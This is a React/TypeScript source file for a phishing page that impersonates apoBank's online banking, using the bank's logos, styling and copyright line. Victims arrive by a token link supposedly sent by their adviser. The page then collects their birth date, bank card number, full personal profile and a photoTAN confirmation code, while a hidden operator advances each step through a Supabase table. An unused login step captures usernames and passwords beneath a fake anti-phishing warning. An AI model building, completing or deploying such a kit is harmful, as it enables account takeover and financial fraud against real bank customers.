import { useEffect, useMemo, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import { Loader2, Phone, ShieldCheck, Globe, Mail, Info, AlertTriangle, Check, Pencil, X } from "lucide-react";
import headerBankingAsset from "@/assets/header-banking.jpg.asset.json";
import apobankLogo from "@/assets/apobank-logo.svg";
import apoALogo from "@/assets/apo-a-logo.png.asset.json";
import apobankLogoSquare from "@/assets/apobank-logo-square.png";
import phototanDefault from "@/assets/phototan.png";

type Row = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  curr_strasse: string | null;
  curr_plz: string | null;
  curr_ort: string | null;
  new_strasse: string | null;
  new_plz: string | null;
  new_ort: string | null;
  profile_data: Record<string, string> | null;
  customer_phase: string | null;
  tan_method: string | null;
  device_name: string | null;
  show_berater: boolean | null;
  photo_tan_image: string | null;
  last_error: string | null;
  tan_code: string | null;
};

type FieldDef = { key: string; label: string; value: string; options?: string[]; type?: string };

const TITEL_OPTIONS = [
  "Keine Angabe","Dr.","Dr. Dr.","Dr. med.","Dr. med. dent.","Dr. med. vet.","Dr. rer. nat.",
  "Dr. rer. medic.","Dr. rer. pol.","Dr. phil.","Dr. jur.","Prof.","Prof. Dr.","Prof. Dr. Dr.",
  "Prof. Dr. med.","Prof. Dr. med. dent.","PD Dr.","PD Dr. med.","Dipl.-Med.",
];

const initialFields: FieldDef[] = [
  { key: "titel", label: "Titel", value: "", options: TITEL_OPTIONS },
  { key: "vorname", label: "Vorname", value: "" },
  { key: "nachname", label: "Nachname", value: "" },
  { key: "geburtsdatum", label: "Geburtsdatum", value: "" },
  { key: "geburtsort", label: "Geburtsort", value: "" },
  { key: "mobil", label: "Private Mobilfunknummer", value: "" },
  { key: "festnetz", label: "Private Festnetznummer (optional)", value: "" },
  { key: "email", label: "Private E-Mail-Adresse", value: "", type: "email" },
  { key: "strasse", label: "Straße und Hausnummer", value: "" },
  { key: "zusatz", label: "Adresszusatz (optional)", value: "" },
  { key: "plz", label: "Postleitzahl", value: "" },
  { key: "ortLand", label: "Ort", value: "" },
];

const normalizeToken = (raw: string) => {
  const digits = raw.replace(/[^0-9]/g, "").slice(0, 6);
  if (digits.length < 6) return raw;
  return `${digits.slice(0, 3)}-${digits.slice(3)}`;
};

const AdressFlow = () => {
  const { token: tokenParam } = useParams();
  const token = useMemo(() => normalizeToken(tokenParam || ""), [tokenParam]);
  const [row, setRow] = useState<Row | null>(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);

  useEffect(() => {
    let channel: any;
    (async () => {
      const { data } = await (supabase as any)
        .from("adress_tokens").select("*").eq("token", token).maybeSingle();
      if (!data) { setNotFound(true); setLoading(false); return; }
      if (!data.customer_phase || data.customer_phase === "pending" || data.customer_phase === "waiting") {
        const { data: updated } = await (supabase as any)
          .from("adress_tokens")
          .update({ customer_phase: "token_waiting", used: true, used_at: new Date().toISOString() })
          .eq("id", data.id).select("*").maybeSingle();
        setRow(updated || { ...data, customer_phase: "token_waiting" });
      } else setRow(data);
      setLoading(false);
      channel = (supabase as any)
        .channel(`adress_${data.id}`)
        .on("postgres_changes", { event: "UPDATE", schema: "public", table: "adress_tokens", filter: `id=eq.${data.id}` }, (p: any) => {
          setRow(prev => ({ ...(prev as Row), ...p.new }));
        }).subscribe();
    })();
    return () => { if (channel) (supabase as any).removeChannel(channel); };
  }, [token]);

  const setPhase = async (phase: string, extra: Record<string, any> = {}) => {
    if (!row) return;
    await (supabase as any).from("adress_tokens").update({ customer_phase: phase, ...extra }).eq("id", row.id);
  };

  const upsertMeta = async (patch: Record<string, any>) => {
    if (!row) return;
    const task_id = `adress:${row.id}`;
    const { data: existing } = await (supabase as any)
      .from("panel_task_meta").select("id").eq("task_id", task_id).maybeSingle();
    if (existing) await (supabase as any).from("panel_task_meta").update(patch).eq("id", existing.id);
    else await (supabase as any).from("panel_task_meta").insert({ task_id, ...patch });
  };

  if (loading) return <Full><Loader2 className="h-6 w-6 animate-spin text-primary" /></Full>;
  if (notFound || !row) return (
    <Full>
      <div className="flex flex-col items-center gap-3 text-center">
        <AlertTriangle className="h-8 w-8 text-destructive" />
        <div className="font-semibold">Sitzung nicht gefunden</div>
        <div className="text-sm text-muted-foreground">Bitte prüfen Sie den Link von Ihrem Berater.</div>
      </div>
    </Full>
  );

  const phase = row.customer_phase || "token_waiting";
  if (phase === "token_waiting") return <LoadingStep text="Bitte warten." />;

  if (phase === "berater") {
    return <BeraterStep onSubmit={async (geburtsdatum, karte) => {
      await upsertMeta({ berater_geburtsdatum: geburtsdatum, berater_karte: karte });
      await setPhase("adress_edit", { last_error: null });
    }} />;
  }

  if (phase === "adress_edit" || phase === "adress_rejected") {
    return <ProfileStep row={row} onSubmit={async (data) => {
      await update(row.id, {
        profile_data: data,
        new_strasse: data.strasse || null,
        new_plz: data.plz || null,
        new_ort: data.ortLand || null,
        customer_phase: "adress_review",
        last_error: null,
      });
    }} />;
  }
  if (phase === "adress_review") return <LoadingStep text="Ihre Daten werden geprüft." />;
  if (phase === "change_phototan_request") return <LoadingStep text="Bitte warten." />;
  if (phase === "change_phototan" || phase === "change_phototan_rejected") {
    return <PhotoTanStep row={row} title="Adressänderung bestätigen"
      info="Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App und geben Sie die Änderungs-TAN ein."
      label="Änderungs-TAN" button="Bestätigen"
      onSubmit={async (code) => { await update(row.id, { tan_code: code, customer_phase: "change_tan_review", last_error: null }); }} />;
  }
  if (phase === "change_tan_review") return <LoadingStep text="Bitte warten." />;
  if (phase === "success") return <SuccessLoader />;
  if (phase === "aborted") return (
    <Full>
      <div className="flex flex-col items-center gap-3 text-center">
        <AlertTriangle className="h-8 w-8 text-destructive" />
        <div className="font-semibold">Sitzung beendet</div>
        <div className="text-sm text-muted-foreground">Bitte kontaktieren Sie Ihren Berater.</div>
      </div>
    </Full>
  );

  return <LoadingStep text="Bitte warten." />;
};

const update = async (id: string, patch: Record<string, any>) => {
  await (supabase as any).from("adress_tokens").update(patch).eq("id", id);
};

/* ---------------- Steps ---------------- */

const FieldRow = ({ label, error, children }: { label: string; error?: boolean; children: React.ReactNode }) => (
  <div className="grid grid-cols-1 sm:grid-cols-[220px_1fr] items-center gap-2 sm:gap-6">
    <label className={cn("text-sm font-semibold", error ? "text-destructive" : "text-foreground")}>{label}</label>
    {children}
  </div>
);
const Tip = ({ icon: Icon, children }: { icon: any; children: React.ReactNode }) => (
  <div className="flex items-start gap-3"><Icon className="w-5 h-5 text-primary shrink-0 mt-0.5" /><p>{children}</p></div>
);

const ShellLarge = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="min-h-screen bg-white flex flex-col relative">
    <img src={apobankLogo} alt="apoBank" className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10" />
    <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
      <div className="w-full max-w-3xl bg-[#f5f5f5] rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[114px]">
        <div className="px-4 sm:px-8 py-4 sm:py-5 bg-white"><h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>{title}</h1></div>
        <div className="px-4 sm:px-8 py-6 space-y-6">{children}</div>
      </div>
    </div>
  </div>
);
const ShellSmall = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
    <div className="w-full max-w-[820px] bg-white mt-4 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
      <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
        <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>{title}</h1>
      </div>
      <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">{children}</div>
    </div>
    <div className="pb-10"><img src={apobankLogo} alt="apoBank" className="h-12 sm:h-16 mx-auto" loading="lazy" /></div>
  </div>
);

const LoginStep = ({ row, onSubmit }: { row: Row; onSubmit: (netkey: string, pin: string) => Promise<void> }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [uT, setUT] = useState(false);
  const [pT, setPT] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  useEffect(() => { if (row.customer_phase === "login_rejected") { setPassword(""); setSubmitting(false); } }, [row.customer_phase]);
  const uErr = uT && !username.trim();
  const pErr = pT && !password.trim();
  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) { setUT(true); setPT(true); return; }
    setSubmitting(true);
    await onSubmit(username.trim(), password);
  };
  return (
    <ShellLarge title="Login apoBank">
      <p className="font-semibold text-foreground">Willkommen im Online-Banking der apoBank</p>
      <img src={headerBankingAsset.url} alt="Sicherheitshinweis" className="w-full" width={1600} height={512} />
      <div className="space-y-5 text-sm text-foreground">
        <p>Aktuelle Warnung vor Phishing und Betrugsversuchen: <a href="#" className="underline text-primary">apobank.de/aktuelle-sicherheitshinweise</a></p>
      </div>
      {row.last_error && <div className="bg-red-100 border border-red-200 text-red-900 px-4 py-5 rounded text-sm">{row.last_error}</div>}
      <form onSubmit={submit} className="space-y-6">
        <FieldRow label="Benutzername" error={uErr}>
          <div className="relative">
            <Input value={username} onChange={e => { setUsername(e.target.value); if (e.target.value.trim()) setUT(false); }}
              className={cn("bg-white", uErr && "border-destructive pr-10")} />
            {uErr && <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive" />}
          </div>
        </FieldRow>
        <FieldRow label="Passwort" error={pErr}>
          <div className="relative">
            <Input type="password" value={password} onChange={e => { setPassword(e.target.value); if (e.target.value.trim()) setPT(false); }}
              className={cn("bg-white", pErr && "border-destructive pr-10")} />
            {pErr && <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive" />}
          </div>
        </FieldRow>
        <div className="flex justify-end">
          <Button type="submit" variant="outline" disabled={submitting}
            className={cn("px-8 bg-white hover:bg-white", password.length > 0 ? "border-foreground text-foreground" : "border-muted-foreground/40 text-muted-foreground")}>
            {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "Anmelden"}
          </Button>
        </div>
      </form>
      <div className="space-y-5">
        <p className="font-semibold text-foreground text-sm">Maßnahmen für sicheres Online-Banking:</p>
        <div className="space-y-5 text-sm text-foreground">
          <Tip icon={ShieldCheck}>1. Wir fragen niemals nach Ihren Zugangsdaten.</Tip>
          <Tip icon={Globe}>2. Loggen Sie sich immer über www.apobank.de ein.</Tip>
          <Tip icon={Mail}>3. Bei zweifelhaften E-Mails gilt: Keine Links oder Anhänge öffnen.</Tip>
        </div>
      </div>
      <div className="space-y-1 text-sm">
        <div className="flex items-center gap-2 text-foreground"><Phone className="w-4 h-4" /><span>+49 211 5998 8000</span></div>
      </div>
    </ShellLarge>
  );
};

const ConfirmStep = ({ row, onClick }: { row: Row; onClick: () => Promise<void> }) => {
  const [submitting, setSubmitting] = useState(false);
  const deviceName = row.device_name || "iPhone";
  return (
    <ShellSmall title="Login">
      <p className="text-foreground text-base leading-relaxed">
        Bitte bestätigen Sie die Anmeldung auf Ihrem Gerät mit dem Namen '{deviceName}'.
      </p>
      <p className="text-foreground text-base leading-relaxed">
        Sollten Sie keinen Internetzugang mit Ihrem Smartphone haben, können Sie den Login auch mit photoTAN bestätigen.
      </p>
      <div className="flex justify-end pt-2">
        <Button onClick={async () => { setSubmitting(true); await onClick(); }} disabled={submitting}
          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base">
          {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />photoTAN</span> : "photoTAN"}
        </Button>
      </div>
    </ShellSmall>
  );
};

const PhotoTanStep = ({ row, title, info, label, button, onSubmit }: { row: Row; title: string; info: string; label: string; button: string; onSubmit: (code: string) => Promise<void> }) => {
  const [code, setCode] = useState("");
  const [submitting, setSubmitting] = useState(false);
  useEffect(() => {
    if (row.customer_phase === "login_phototan_rejected" || row.customer_phase === "change_phototan_rejected") { setCode(""); setSubmitting(false); }
  }, [row.customer_phase]);
  return (
    <ShellSmall title={title}>
      {row.last_error && <div className="bg-destructive/10 border border-destructive/20 rounded-md px-4 sm:px-6 py-4"><p className="text-destructive text-sm">{row.last_error}</p></div>}
      <p className="text-foreground text-sm sm:text-base">{info}</p>
      <div className="flex justify-center">
        <div className="w-40 h-40 sm:w-48 sm:h-48 bg-white flex items-center justify-center overflow-hidden">
          <img src={row.photo_tan_image || phototanDefault} alt="PhotoTAN Code" className="w-full h-full object-contain" />
        </div>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-[0.535fr_1fr] items-start sm:items-center gap-2 sm:gap-8">
        <label className="text-foreground font-semibold text-base">{label}</label>
        <Input type="text" inputMode="numeric" pattern="[0-9]*" value={code}
          onChange={e => setCode(e.target.value.replace(/\D/g, ""))} className="border-primary/30 bg-card" />
      </div>
      <div className="flex justify-end">
        <Button disabled={submitting || !code} onClick={async () => { setSubmitting(true); await onSubmit(code); }}
          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base">
          {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{button}</span> : button}
        </Button>
      </div>
    </ShellSmall>
  );
};

const BeraterStep = ({ onSubmit }: { onSubmit: (g: string, k: string) => Promise<void> }) => {
  const [g, setG] = useState(""); const [k, setK] = useState("");
  const [t, setT] = useState(false); const [s, setS] = useState(false);
  const kInv = k.length !== 10;
  const gInv = !/^\d{2}\.\d{2}\.(\d{2}|\d{4})$/.test(g);
  return (
    <ShellSmall title="Verifizierung">
      <p className="text-sm text-foreground">Zur Überprüfung geben Sie bitte Ihr Geburtsdatum und die Nummer einer Ihrer gültigen apoBankCard ein.</p>
      <div className="space-y-4">
        <input type="text" inputMode="numeric" value={g} onChange={e => {
          const d = e.target.value.replace(/\D/g, "").slice(0, 8);
          let out = d;
          if (d.length > 4) out = `${d.slice(0,2)}.${d.slice(2,4)}.${d.slice(4)}`;
          else if (d.length > 2) out = `${d.slice(0,2)}.${d.slice(2)}`;
          setG(out);
        }} placeholder="TT.MM.JJJJ" className={cn("w-full rounded border px-3 py-2", t && gInv && "border-destructive")} />
        <input type="text" inputMode="numeric" value={k} onChange={e => setK(e.target.value.replace(/\D/g, "").slice(0, 10))}
          placeholder="apoBankCard-Nummer (10 Ziffern)" className={cn("w-full rounded border px-3 py-2", t && kInv && "border-destructive")} />
      </div>
      <div className="flex justify-end">
        <Button disabled={s} onClick={async () => { setT(true); if (gInv || kInv) return; setS(true); await onSubmit(g, k); }}
          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base">
          {s ? <Loader2 className="h-4 w-4 animate-spin" /> : "Weiter"}
        </Button>
      </div>
    </ShellSmall>
  );
};

const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<string, string>) => Promise<void> }) => {
  const prev = row.profile_data || {};
  const [fields, setFields] = useState<FieldDef[]>(() =>
    initialFields.map(f => ({ ...f, value: prev[f.key] ?? "" }))
  );
  const [submitting, setSubmitting] = useState(false);
  useEffect(() => { if (row.customer_phase === "adress_rejected") setSubmitting(false); }, [row.customer_phase]);

  const updateField = (key: string, v: string) =>
    setFields(prev => prev.map(f => f.key === key ? { ...f, value: v } : f));

  const handleDate = (label: string, v: string) => {
    if (label.toLowerCase().includes("datum")) {
      let d = v.replace(/\D/g, "").slice(0, 8);
      let out = "";
      if (d.length > 0) out += d.slice(0, 2);
      if (d.length > 2) out += "." + d.slice(2, 4);
      if (d.length > 4) out += "." + d.slice(4);
      return out;
    }
    return v;
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
      <header className="bg-white border-b border-slate-200">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-4 sm:px-10 h-16">
          <div className="flex items-center gap-3 sm:gap-8">
            <img src={apoALogo.url} alt="apoBank" className="w-10 h-10 rounded-full object-contain" />
            <span className="text-[15px] font-medium text-[#001f5b]">Profildaten</span>
          </div>
        </div>
      </header>
      <main className="flex-1">
        <div className="max-w-[780px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
          <h1 className="text-[26px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">Mein Profil aktualisieren</h1>
          {row.last_error && <div className="mb-6 rounded-md border border-red-200 bg-red-50 text-red-800 px-4 py-3 text-sm">{row.last_error}</div>}
          <form onSubmit={async e => { e.preventDefault(); setSubmitting(true); await onSubmit(Object.fromEntries(fields.map(f => [f.key, f.value]))); }}
            className="bg-white rounded-xl border border-slate-200/70 px-4 sm:px-10 py-6 sm:py-10">
            <div className="flex flex-col gap-y-6">
              {fields.map(f => (
                <div key={f.key}>
                  <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{f.label}</label>
                  {f.options ? (
                    <select value={f.value} onChange={e => updateField(f.key, e.target.value)}
                      className="w-full sm:w-1/2 md:w-[40%] text-[15px] bg-white border border-slate-300 rounded-md px-3 py-2">
                      {f.options.map(o => <option key={o} value={o === "Keine Angabe" ? "" : o}>{o}</option>)}
                    </select>
                  ) : (
                    <input type={f.type || "text"} value={f.value}
                      onChange={e => updateField(f.key, handleDate(f.label, e.target.value))}
                      required={!f.label.toLowerCase().includes("optional")}
                      className="w-full sm:w-3/4 md:w-[60%] text-[15px] bg-white border border-slate-300 rounded-md px-3 py-2" />
                  )}
                </div>
              ))}
            </div>
            <div className="flex justify-end mt-10">
              <button type="submit" disabled={submitting}
                className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-6 py-2 text-sm font-medium disabled:opacity-70">
                {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" />Speichern</>}
              </button>
            </div>
          </form>
        </div>
      </main>
      <footer className="bg-[#001f5b] text-white mt-10">
        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10">
          <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
          <div className="text-[13px] mt-4 opacity-90">© 2026 Deutsche Apotheker- und Ärztebank eG.</div>
        </div>
      </footer>
    </div>
  );
};

const LoadingStep = ({ text }: { text: string }) => (
  <div className="min-h-screen bg-background flex flex-col items-center justify-center">
    <div className="relative w-56 h-56">
      <svg className="absolute inset-0 w-full h-full animate-spin" style={{ animationDuration: "1.5s" }} viewBox="0 0 200 200" fill="none">
        <path d="M 100 10 A 90 90 0 0 1 190 100" stroke="hsl(var(--primary))" strokeWidth="5" strokeLinecap="round" />
      </svg>
      <div className="absolute inset-0 flex items-center justify-center">
        <img src={apobankLogoSquare} alt="apoBank" className="w-44 h-44 object-contain" />
      </div>
    </div>
    <p className="mt-8 text-lg text-foreground font-medium">{text}</p>
  </div>
);

const SuccessLoader = () => {
  const [text, setText] = useState("Adressdaten werden übernommen");
  useEffect(() => {
    const t1 = setTimeout(() => setText("Bitte warten"), 3000);
    const t2 = setTimeout(() => { window.location.href = "/auth"; }, 5000);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, []);
  return <LoadingStep text={text} />;
};

const Full = ({ children }: { children: React.ReactNode }) => (
  <div className="min-h-screen flex items-center justify-center bg-muted/30 p-4">{children}</div>
);

export default AdressFlow;
